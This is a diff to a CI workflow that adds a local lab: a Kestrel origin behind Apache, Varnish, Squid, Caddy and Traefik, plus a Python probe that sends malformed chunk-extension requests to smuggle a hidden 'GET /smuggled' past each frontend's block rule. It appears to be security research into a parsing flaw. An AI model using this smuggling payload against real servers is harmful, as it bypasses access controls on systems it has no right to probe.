@@ -378,9 +378,11 @@ jobs:
       - name: Run current-main Kestrel chunk-extension regression tests
         shell: bash
         run: |
-          set -euxo pipefail
+          set -exo pipefail
           cd /tmp/aspnetcore
+          set +u
           source ./activate.sh
+          set -u
           dotnet test src/Servers/Kestrel/test/InMemory.FunctionalTests/InMemory.FunctionalTests.csproj \
             --filter "FullyQualifiedName~ChunkedRequestTests.RejectsInvalidChunkExtensions|FullyQualifiedName~ChunkedRequestTests.AllowsValidChunkExtensions" \
             --logger "console;verbosity=normal" | tee /tmp/aspnetcore-main-kestrel-tests.log
@@ -391,3 +393,287 @@ jobs:
         with:
           name: aspnetcore-main-kestrel-regression
           path: /tmp/aspnetcore-main-kestrel-tests.log
+
+
+  more-frontends-net10:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    name: more-frontends-net10
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Install Apache, Varnish, and Squid
+        shell: bash
+        run: |
+          sudo apt-get update
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y apache2 varnish squid
+          sudo a2enmod proxy proxy_http >/dev/null
+
+      - name: Build instrumented Kestrel origin
+        shell: bash
+        run: |
+          set -euxo pipefail
+          mkdir -p /tmp/frontends-lab
+          cat >/tmp/frontends-lab/Lab.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+          </Project>
+          EOF
+          cat >/tmp/frontends-lab/Program.cs <<'EOF'
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.ConfigureKestrel(o => o.ListenLocalhost(5005));
+          var app = builder.Build();
+          app.Run(async context =>
+          {
+              using var body = new MemoryStream();
+              await context.Request.Body.CopyToAsync(body);
+              var probe = context.Request.Headers["X-Probe"].ToString();
+              Console.WriteLine($"ORIGIN_HIT probe={probe} method={context.Request.Method} path={context.Request.Path} bodyHex={Convert.ToHexString(body.ToArray())}");
+              await context.Response.WriteAsync($"{context.Request.Method} {context.Request.Path}");
+          });
+          await app.RunAsync();
+          EOF
+          dotnet build /tmp/frontends-lab/Lab.csproj -c Release
+
+      - name: Configure frontends
+        shell: bash
+        run: |
+          set -euxo pipefail
+
+          cat >/tmp/apache-lab.conf <<'EOF'
+          ServerRoot "/etc/apache2"
+          PidFile /tmp/apache-lab.pid
+          Listen 127.0.0.1:5008
+          ServerName localhost
+          IncludeOptional mods-enabled/*.load
+          IncludeOptional mods-enabled/*.conf
+          User www-data
+          Group www-data
+          ErrorLog /tmp/apache-error.log
+          LogLevel info
+          CustomLog /tmp/apache-access.log combined
+          ProxyRequests Off
+          ProxyPass / http://127.0.0.1:5005/
+          ProxyPassReverse / http://127.0.0.1:5005/
+          <Location "/smuggled">
+              Require all denied
+          </Location>
+          EOF
+
+          cat >/tmp/varnish-lab.vcl <<'EOF'
+          vcl 4.1;
+          backend default {
+              .host = "127.0.0.1";
+              .port = "5005";
+          }
+          sub vcl_recv {
+              if (req.url == "/smuggled") {
+                  return (synth(403, "blocked"));
+              }
+              return (pass);
+          }
+          EOF
+
+          cat >/tmp/squid-lab.conf <<'EOF'
+          http_port 127.0.0.1:5010 accel vhost defaultsite=localhost
+          cache_peer 127.0.0.1 parent 5005 0 no-query originserver name=origin
+          acl blocked urlpath_regex ^/smuggled$
+          http_access deny blocked
+          http_access allow all
+          cache_peer_access origin allow all
+          access_log stdio:/tmp/squid-access.log
+          cache_log /tmp/squid-cache.log
+          pid_filename /tmp/squid-lab.pid
+          coredump_dir /tmp
+          EOF
+
+          cat >/tmp/Caddyfile <<'EOF'
+          :5011 {
+              @blocked path /smuggled
+              respond @blocked 403
+              reverse_proxy 127.0.0.1:5005
+          }
+          EOF
+
+          cat >/tmp/traefik-static.yml <<'EOF'
+          entryPoints:
+            web:
+              address: ":5012"
+          providers:
+            file:
+              filename: /etc/traefik/dynamic.yml
+          log:
+            level: INFO
+          EOF
+
+          cat >/tmp/traefik-dynamic.yml <<'EOF'
+          http:
+            routers:
+              blocked:
+                rule: "Path(\`/smuggled\`)"
+                entryPoints: [web]
+                priority: 100
+                middlewares: [denyall]
+                service: origin
+              normal:
+                rule: "PathPrefix(\`/\`)"
+                entryPoints: [web]
+                priority: 1
+                service: origin
+            middlewares:
+              denyall:
+                ipAllowList:
+                  sourceRange:
+                    - "192.0.2.0/24"
+            services:
+              origin:
+                loadBalancer:
+                  servers:
+                    - url: "http://127.0.0.1:5005"
+          EOF
+
+      - name: Run frontend differential matrix
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cd /tmp/frontends-lab
+          dotnet run --no-build -c Release --project Lab.csproj >origin.log 2>&1 &
+          echo $! > origin.pid
+
+          sudo /usr/sbin/apache2 -f /tmp/apache-lab.conf -DFOREGROUND >/tmp/apache-stdout.log 2>&1 &
+          echo $! > apache.pid
+          sudo varnishd -a 127.0.0.1:5009 -f /tmp/varnish-lab.vcl -s malloc,64m -F >/tmp/varnish.log 2>&1 &
+          echo $! > varnish.pid
+          sudo squid -N -f /tmp/squid-lab.conf >/tmp/squid-stdout.log 2>&1 &
+          echo $! > squid.pid
+          docker run --rm --network host --name caddy-lab -v /tmp/Caddyfile:/etc/caddy/Caddyfile:ro caddy:2 >/tmp/caddy.log 2>&1 &
+          docker run --rm --network host --name traefik-lab -v /tmp/traefik-static.yml:/etc/traefik/traefik.yml:ro -v /tmp/traefik-dynamic.yml:/etc/traefik/dynamic.yml:ro traefik:v3 >/tmp/traefik.log 2>&1 &
+
+          cleanup() {
+            kill "$(cat origin.pid)" 2>/dev/null || true
+            sudo kill "$(cat apache.pid)" 2>/dev/null || true
+            sudo kill "$(cat varnish.pid)" 2>/dev/null || true
+            sudo kill "$(cat squid.pid)" 2>/dev/null || true
+            docker rm -f caddy-lab traefik-lab >/dev/null 2>&1 || true
+          }
+          trap cleanup EXIT
+
+          python3 - <<'PY'
+          import socket,time
+          for _ in range(120):
+              ok=True
+              for p in [5005,5008,5009,5010,5011,5012]:
+                  try:
+                      s=socket.create_connection(("127.0.0.1",p),timeout=.2);s.close()
+                  except Exception:
+                      ok=False
+              if ok: break
+              time.sleep(.25)
+          PY
+
+          cat >frontends_probe.py <<'PY'
+          import json, socket, time
+
+          targets=[
+              ("direct",5005),
+              ("apache",5008),
+              ("varnish",5009),
+              ("squid",5010),
+              ("caddy",5011),
+              ("traefik",5012),
+          ]
+
+          def payload(label, malformed=True):
+              chunk = b'1;a="\r\n' if malformed else b"1;a=b\r\n"
+              second = (
+                  b"GET /smuggled HTTP/1.1\r\n"
+                  b"Host: localhost\r\n"
+                  + f"X-Probe: {label}\r\n".encode()
+                  + b"Content-Length: 11\r\n"
+                  b"Connection: close\r\n"
+                  b"\r\n"
+                  b'"\r\nY\r\n0\r\n\r\n'
+              )
+              return (
+                  b"POST /public HTTP/1.1\r\n"
+                  b"Host: localhost\r\n"
+                  b"Transfer-Encoding: chunked\r\n"
+                  + f"X-Probe: {label}-first\r\n".encode()
+                  + (b"Connection: close\r\n" if not malformed else b"")
+                  + b"\r\n"
+                  + chunk + b"X\r\n0\r\n\r\n"
+                  + (second if malformed else b"")
+              )
+
+          def send(port,data):
+              s=socket.create_connection(("127.0.0.1",port),timeout=4)
+              s.settimeout(4)
+              s.sendall(data)
+              out=bytearray()
+              while True:
+                  try:
+                      part=s.recv(65536)
+                      if not part: break
+                      out.extend(part)
+                  except socket.timeout:
+                      break
+              s.close()
+              raw=bytes(out)
+              return {
+                  "responses":raw.count(b"HTTP/1.1 "),
+                  "statuses":[x.decode("latin1","replace") for x in raw.split(b"\r\n") if x.startswith(b"HTTP/1.")],
+                  "preview":raw[:1200].decode("latin1","replace")
+              }
+
+          results={}
+          for label,port in targets:
+              try:
+                  results[label]={
+                      "valid":send(port,payload(label+"-valid",False)),
+                      "quoted_poc":send(port,payload(label,True)),
+                  }
+              except Exception as e:
+                  results[label]={"error":repr(e)}
+              time.sleep(.25)
+
+          print(json.dumps(results,indent=2,sort_keys=True))
+          open("frontends-results.json","w").write(json.dumps(results,indent=2,sort_keys=True))
+          PY
+
+          python3 frontends_probe.py | tee frontends-probe.out
+          sleep 1
+          echo "=== ORIGIN HITS ==="
+          grep ORIGIN_HIT origin.log || true
+          echo "=== APACHE ERROR ==="
+          tail -100 /tmp/apache-error.log || true
+          echo "=== VARNISH ==="
+          tail -100 /tmp/varnish.log || true
+          echo "=== SQUID ==="
+          tail -100 /tmp/squid-cache.log || true
+          echo "=== CADDY ==="
+          tail -100 /tmp/caddy.log || true
+          echo "=== TRAEFIK ==="
+          tail -100 /tmp/traefik.log || true
+
+      - name: Upload frontend matrix
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kestrel-more-frontends-net10
+          path: |
+            /tmp/frontends-lab/frontends-results.json
+            /tmp/frontends-lab/frontends-probe.out
+            /tmp/frontends-lab/origin.log
+            /tmp/apache-error.log
+            /tmp/varnish.log
+            /tmp/squid-cache.log
+            /tmp/caddy.log
+            /tmp/traefik.log
